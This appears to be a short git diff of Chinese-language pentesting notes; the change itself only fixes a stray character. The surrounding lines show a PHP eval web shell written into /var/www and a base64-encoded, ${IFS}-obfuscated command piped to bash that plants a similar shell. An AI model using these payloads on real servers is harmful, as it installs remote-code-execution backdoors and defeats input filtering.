@@ -194,7 +194,7 @@ Linux
 echo -e "\x61">1.txt
 ```
 
-将payload加密成base64 例如 `echo '<?php @eval($_REQUEST[c]);?>'>>/var/www/c.php`s
+将payload加密成base64 例如 `echo '<?php @eval($_REQUEST[c]);?>'>>/var/www/c.php`
 ```
 `echo${IFS}"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}-D|bash`
 ```
